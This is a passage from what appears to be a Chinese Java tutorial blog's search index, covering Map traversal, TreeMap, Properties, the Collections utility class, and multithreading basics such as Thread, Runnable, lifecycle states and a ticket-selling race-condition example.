map.keySet();</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> set.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            System.out.println(iterator.next());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历所有的value集：values()</span></span><br><span class="line">        <span class="type">Collection</span> <span class="variable">values</span> <span class="operator">=</span> map.values();</span><br><span class="line">        <span class="keyword">for</span> (Object obj : values) &#123;</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历所有的key-value</span></span><br><span class="line">        <span class="comment">//方式一：entrySet()</span></span><br><span class="line">        <span class="type">Set</span> <span class="variable">entrySet</span> <span class="operator">=</span> map.entrySet();</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator1</span> <span class="operator">=</span> entrySet.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator1.hasNext()) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> iterator1.next();</span><br><span class="line">            <span class="comment">//entrySet集合中的元素都是entry</span></span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) obj;</span><br><span class="line">            System.out.println(entry.getKey() + <span class="string">&quot;----&gt;&quot;</span> + entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//方式二：</span></span><br><span class="line">        <span class="type">Set</span> <span class="variable">keySet</span> <span class="operator">=</span> map.keySet();</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator2</span> <span class="operator">=</span> keySet.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator2.hasNext()) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> iterator2.next();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">            System.out.println(key + <span class="string">&quot;=====&quot;</span> + value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><ul><li><p>TreeMap存储 Key-Value 对时，需要根据 key-value 对进行排序。TreeMap 可以保证所有的 Key-Value 对处于有序状态。 </p></li><li><p>TreeMap底层使用红黑树结构存储数据</p></li><li><p>TreeMap 的 Key 的排序：</p><ul><li>自然排序：TreeMap 的所有的 Key 必须实现 Comparable 接口，而且所有的 Key 应该是同一个类的对象，否则将会抛出 ClasssCastException</li><li>定制排序：创建 TreeMap 时，传入一个 Comparator 对象，该对象负责对TreeMap 中的所有 key 进行排序。此时不需要 Map 的 Key 实现Comparable 接口</li></ul></li><li><p>TreeMap判断两个key相等的标准：两个key通过compareTo()方法或者compare()方法返回0。</p></li></ul><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PropertiesTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Properties:常用来处理配置文件。key和value都是String类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Properties</span> <span class="variable">pros</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">            fis = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;jdbc.properties&quot;</span>);</span><br><span class="line">            pros.load(fis);<span class="comment">//加载流对应的文件</span></span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> pros.getProperty(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> pros.getProperty(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;name = &quot;</span> + name + <span class="string">&quot;, password = &quot;</span> + password);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (fis != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fis.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name</span>=<span class="string">阿楠</span></span><br><span class="line"><span class="attr">password</span>=<span class="string">123456</span></span><br></pre></td></tr></table></figure><h1 id="Collections工具类"><a href="#Collections工具类" class="headerlink" title="Collections工具类"></a>Collections工具类</h1><ul><li><p>Collections 是一个操作 Set、List 和 <strong>Map</strong>等集合的工具类（<strong>操作数组的工具类：</strong>Arrays）</p></li><li><p>Collections 中提供了一系列静态的方法对集合元素进行排序、查询和修改等操作，还提供了对集合对象设置不可变、对集合对象实现同步控制等方法</p></li><li><p>排序操作：（均为<strong>static方法）</strong></p><ul><li>reverse(List)：反转 List 中元素的顺序</li><li>shuffle(List)：对 List 集合元素进行随机排序</li><li>sort(List)：根据元素的自然顺序对指定 List 集合元素按升序排序</li><li>sort(List，Comparator)：根据指定的 Comparator 产生的顺序对 List 集合元素进行排序</li><li>swap(List，int， int)：将指定 list 集合中的 i 处元素和 j 处元素进行交换</li></ul></li><li><p>查找、替换</p><ul><li>Object max(Collection)：根据元素的自然顺序，返回给定集合中的最大元素</li><li>Object max(Collection，Comparator)：根据 Comparator 指定的顺序，返回给定集合中的最大元素</li><li>Object min(Collection)</li><li>Object min(Collection，Comparator)</li><li>int frequency(Collection，Object)：返回指定集合中指定元素的出现次数</li><li>void copy(List dest,List src)：将src中的内容复制到dest中 </li><li>boolean replaceAll(List list，Object oldVal，Object newVal)：使用新值替换List 对象的所有旧值</li></ul></li><li><p>Collections 类中提供了多个 synchronizedXxx() 方法，该方法可使将指定集合包装成线程同步的集合，从而可以解决<strong>多线程并发访问集合时的线程安全问题</strong></p></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200920103137.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CollectionsTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        list.add(<span class="number">123</span>);</span><br><span class="line">        list.add(<span class="number">43</span>);</span><br><span class="line">        list.add(<span class="number">765</span>);</span><br><span class="line">        list.add(-<span class="number">97</span>);</span><br><span class="line">        list.add(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//报异常：IndexOutOfBoundsException(&quot;Source does not fit in dest&quot;)</span></span><br><span class="line"><span class="comment">//        List dest = new ArrayList();</span></span><br><span class="line"><span class="comment">//        Collections.copy(dest,list);</span></span><br><span class="line">        <span class="comment">//正确的：</span></span><br><span class="line">        <span class="type">List</span> <span class="variable">dest</span> <span class="operator">=</span> Arrays.asList(<span class="keyword">new</span> <span class="title class_">Object</span>[list.size()]);<span class="comment">//需指定dest.size = list.size</span></span><br><span class="line">        System.out.println(dest.size());<span class="comment">//list.size();5</span></span><br><span class="line">        Collections.copy(dest, list);</span><br><span class="line"></span><br><span class="line">        System.out.println(dest);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//返回的list1即为线程安全的List</span></span><br><span class="line">        <span class="type">List</span> <span class="variable">list1</span> <span class="operator">=</span> Collections.synchronizedList(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200920103358.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 高级编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> List </tag>
            
            <tag> Map </tag>
            
            <tag> Set </tag>
            
            <tag> Iterator </tag>
            
            <tag> Collection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多线程</title>
      <link href="/posts/5ea3/"/>
      <url>/posts/5ea3/</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="程序、进程、线程"><a href="#程序、进程、线程" class="headerlink" title="程序、进程、线程"></a>程序、进程、线程</h2><ul><li><p>程序（program）是为完成特定任务、用某种语言编写的一组指令的集合。即指<strong>一段静态的代码</strong>，静态对象。</p></li><li><p>进程（process）是程序的一次执行过程，或是<strong>正在运行的一个程序</strong>。是一个动态的过程：有它自身的产生、存在和消亡的过程。——生命周期</p><ul><li>如：运行中的QQ，运行中的MP3播放器</li><li>程序是静态的，进程是动态的</li><li><strong>进程作为资源分配的单位</strong>，系统在运行时会为每个进程分配不同的内存区域</li></ul></li><li><p>线程（thread），进程可进一步细化为线程，是一个程序内部的一条执行路径。</p><ul><li>若一个进程同一时间<strong>并行</strong>执行多个线程，就是支持多线程的</li><li><strong>线程作为调度和执行的单位，每个线程拥有独立的运行栈和程序计数器（pc）</strong>，线程切换的开销小</li><li>一个进程中的多个线程共享相同的内存单元&#x2F;内存地址空间–&gt;它们从同一堆中分配对象，可以访问相同的变量和对象。这就使得线程间通信更简便、高效。但多个线程操作共享的系统资源可能就会带来<strong>安全的隐患。</strong></li></ul></li></ul><h2 id="单核CPU和多核CPU的理解"><a href="#单核CPU和多核CPU的理解" class="headerlink" title="单核CPU和多核CPU的理解"></a>单核CPU和多核CPU的理解</h2><ul><li>单核CPU，其实是一种假的多线程，因为在一个时间单元内，也只能执行一个线程的任务。例如：虽然有多车道，但是收费站只有一个工作人员在收费，只有收了费才能通过，那么CPU就好比收费人员。如果有某个人不想交钱，那么收费人员可以把他“挂起”（晾着他，等他想通了，准备好了钱，再去收费）。但是因为CPU时间单元特别短，因此感觉不出来。</li><li>如果是多核的话，才能更好的发挥多线程的效率。（现在的服务器都是多核的）</li><li>一个Java应用程序java.exe，<strong>其实至少有三个线程：main（）主线程，gc（）垃圾回收线程，异常处理线程。</strong>当然如果发生异常，会影响主线程。</li></ul><h2 id="并行与并发"><a href="#并行与并发" class="headerlink" title="并行与并发"></a>并行与并发</h2><blockquote><p>并行：多个CPU同时执行多个任务。比如：多个人同时做不同的事。<br>并发：一个CPU（采用时间片）同时执行多个任务。比如：秒杀、多个人做同一件事。</p></blockquote><h2 id="使用多线程的优点"><a href="#使用多线程的优点" class="headerlink" title="使用多线程的优点"></a>使用多线程的优点</h2><p><strong>背景：</strong>以单核CPU为例，只使用单个线程先后完成多个任务（调用多个方法），肯定比用多个线程来完成用的时间更短，为何仍需多线程呢？</p><p>多线程程序的优点：</p><ol><li><p>提高应用程序的响应。对图形化界面更有意义，可增强用户体验。</p></li><li><p>提高计算机系统CPU的利用率。</p></li><li><p>改善程序结构。将既长又复杂的进程分为多个线程，独立运行，利于理解和修改。</p></li></ol><h2 id="何时需要多线程"><a href="#何时需要多线程" class="headerlink" title="何时需要多线程"></a>何时需要多线程</h2><ul><li><p>程序需要同时执行两个或多个任务。</p></li><li><p>程序需要实现一些需要等待的任务时，如用户输入、文件读写操作、网络操作、搜索等。</p></li><li><p>需要一些后台运行的程序时。</p></li></ul><hr><h1 id="线程的创建和启动"><a href="#线程的创建和启动" class="headerlink" title="线程的创建和启动"></a>线程的创建和启动</h1><h2 id="Thread类"><a href="#Thread类" class="headerlink" title="Thread类"></a>Thread类</h2><ul><li><p>Java语言的JVM允许程序运行多个线程，它通过<strong>java.lang.Thread</strong>类来体现。 </p></li><li><p>Thread类的特性</p><ul><li>每个线程都是通过某个特定Thread对象的run()方法来完成操作的，经常把run()方法的主体称为<strong>线程体</strong></li><li>通过该Thread对象的start()方法来启动这个线程，而非直接调用run()</li></ul></li><li><p>Thread类的构造器</p><ul><li><p>Thread()：创建新的Thread对象</p></li><li><p>Thread(String threadname)<strong>：</strong>创建线程并指定线程实例名</p></li><li><p>Thread(Runnable target)<strong>：</strong>指定创建线程的目标对象，它实现了Runnable接口中的run方法</p></li><li><p>Thread(Runnable target, String name)<strong>：</strong>创建新的Thread对象</p></li></ul></li></ul><h2 id="API中创建线程的两种方式"><a href="#API中创建线程的两种方式" class="headerlink" title="API中创建线程的两种方式"></a>API中创建线程的两种方式</h2><p>JDK1.5之前创建新执行线程有两种方法：继承Thread类的方式和实现Runnable接口的方式</p><hr><p>方式一：<strong>继承Thread类</strong><br>1）定义子类继承Thread类。<br>2）子类中重写Thread类中的run方法。<br>3）创建Thread子类对象，即创建了线程对象。<br>4）调用线程对象start方法：启动线程，调用run方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyThread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread</span>();</span><br><span class="line">        t1.start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;<span class="comment">//lambda表达式，匿名内部类和匿名接口类转换lambda表达式一样</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方式二：<strong>实现Runnable接口</strong></p><ol><li><p>定义子类，实现Runnable接口。</p></li><li><p>子类中重写Runnable接口中的run方法。</p></li><li><p>通过Thread类含参构造器创建线程对象。</p></li><li><p>将Runnable接口的子类对象作为实际参数传递给Thread类的构造器中。</p></li><li><p>调用Thread类的start方法：开启线程，调用Runnable子类接口的run方法。</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyThread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(t1);</span><br><span class="line">        thread.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p> <strong>注意点：</strong></p><ol><li><p>如果自己手动调用run()方法，那么就只是普通方法，没有启动多线程模式。</p></li><li><p>run()方法由JVM调用，什么时候调用，执行的过程控制都有操作系统的CPU调度决定。</p></li><li><p><strong>想要启动多线程，必须调用start方法。</strong></p></li><li><p><strong>一个线程对象只能调用一次start()方法启动</strong>，如果重复调用，则将抛出异常“IllegalThreadStateException”。</p></li></ol><h2 id="继承方式和实现方式的联系与区别"><a href="#继承方式和实现方式的联系与区别" class="headerlink" title="继承方式和实现方式的联系与区别"></a>继承方式和实现方式的联系与区别</h2><p><code>public class Thread extends Object implements Runnable</code><br><strong>区别：</strong></p><ul><li><p>继承Thread：线程代码存放Thread子类run方法中。</p></li><li><p>实现Runnable：线程代码存在接口的子类的run方法。</p></li></ul><p><strong>实现Runnable接口方式的好处：</strong></p><ul><li>避免了单继承的局限性。</li><li>多个线程可以共享同一个接口实现类的对象，非常适合多个相同线程来处理同一份资源。而继承Thread需将属性定义为static才能共享。</li></ul><h2 id="Thread类的有关方法"><a href="#Thread类的有关方法" class="headerlink" title="Thread类的有关方法"></a>Thread类的有关方法</h2><ul><li><p><strong>void start():</strong> 启动线程，并执行对象的run()方法</p></li><li><p><strong>run():</strong> 线程在被调度时执行的操作</p></li><li><p><strong>String getName():</strong> 返回线程的名称</p></li><li><p>void setName(String name):设置该线程名称</p></li><li><p><strong>static Thread currentThread():</strong> 返回当前线程。在Thread子类中就是this，通常用于主线程和Runnable实现类</p></li><li><p><strong>static void yield():</strong> 线程让步。暂停当前正在执行的线程，把执行机会让给优先级相同或更高的线程。若队列中没有同优先级的线程，忽略此方法。</p></li><li><p><strong>join():</strong> 当某个程序执行流中<strong>调用其他线程的 join() 方法</strong>时，调用线程将被阻塞，直到 join() 方法加入的 join 线程执行完为止。低优先级的线程也可以获得执行。</p></li><li><p><strong>static void sleep(long millis):</strong> (指定时间:毫秒) 令当前活动线程在指定时间段内放弃对CPU控制,使其他线程有机会被执行,时间到后重排队。需抛出InterruptedException异常。</p></li><li><p><strong>stop():</strong> 强制线程生命期结束，不推荐使用</p></li><li><p><strong>boolean isAlive():</strong> 返回boolean，判断线程是否还活着</p></li></ul><h2 id="线程的优先级"><a href="#线程的优先级" class="headerlink" title="线程的优先级"></a>线程的优先级</h2><ul><li><p><strong>线程的优先级等级</strong></p><ul><li><p><strong>MAX_PRIORITY：10</strong> </p></li><li><p><strong>MIN _PRIORITY：1</strong> </p></li><li><p><strong>NORM_PRIORITY：5</strong></p></li></ul></li><li><p><strong>涉及的方法</strong></p></li><li><p><strong>getPriority()</strong> <strong>：</strong>返回线程优先值</p></li><li><p><strong>setPriority(int newPriority)</strong> <strong>：</strong>改变线程的优先级</p></li><li><p><strong>说明</strong></p><ul><li>线程创建时继承父线程的优先级</li><li>低优先级只是获得调度的概率低，并非一定是在高优先级线程之后才被调用</li></ul></li></ul><h2 id="线程的调度"><a href="#线程的调度" class="headerlink" title="线程的调度"></a>线程的调度</h2><p><strong>调度策略：</strong></p><ul><li>时间片：<img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200906151855.png"></li><li>抢占式： 高优先级的线程抢占CPU</li></ul><p><strong>Java的调度方法：</strong></p><ul><li><p>同优先级线程组成先进先出队列（先到先服务），使用时间片策略</p></li><li><p>对高优先级，使用优先调度的抢占式策略</p></li></ul><h1 id="线程的生命周期"><a href="#线程的生命周期" class="headerlink" title="线程的生命周期"></a>线程的生命周期</h1><p>JDK中用Thread.State类定义了线程的几种状态，要想实现多线程，必须在主线程中创建新的线程对象。Java语言使用Thread类及其子类的对象来表示线程，在它的一个完整的生命周期中通常要经历如下的五种状态：</p><blockquote><p>新建：当一个Thread类或其子类的对象被声明并创建时，新生的线程对象处于新建状态<br>就绪：处于新建状态的线程被start（）后，将进入线程队列等待CPU时间片，此时它已具备了运行的条件，只是没分配到CPU资源<br>运行：当就绪的线程被调度并获得CPU资源时，便进入运行状态，run（）方法定义了线程的操作和功能<br>阻塞：在某种特殊情况下，被人为挂起或执行输入输出操作时，让出CPU并临时中止自己的执行，进入阻塞状态<br>死亡：线程完成了它的全部工作或线程被提前强制性地中止或出现异常导致结束</p></blockquote><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200906161401.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">State</span> &#123;</span><br><span class="line">        NEW,</span><br><span class="line"></span><br><span class="line">        RUNNABLE,</span><br><span class="line"></span><br><span class="line">        BLOCKED,</span><br><span class="line"></span><br><span class="line">        WAITING,</span><br><span class="line"></span><br><span class="line">        TIMED_WAITING,</span><br><span class="line"></span><br><span class="line">        TERMINATED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="线程的同步"><a href="#线程的同步" class="headerlink" title="线程的同步"></a>线程的同步</h1><h2 id="问题的提出"><a href="#问题的提出" class="headerlink" title="问题的提出"></a>问题的提出</h2><ul><li><p>多个线程执行的不确定性引起执行结果的不稳定。</p></li><li><p>多个线程对账本的共享，会造成操作的不完整性，会破坏数据。</p></li></ul><p><strong>例题：</strong></p><p>模拟火车站售票程序，开启三个窗口售票</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.java;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 例子：创建三个窗口卖票，总票数为100张.使用实现Runnable接口的方式</span></span><br><span class="line"><span class="comment"> * 存在线程的安全问题，待解决。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Window</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:卖票，票号为：&quot;</span> + ticket);</span><br><span class="line">                ticket--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title 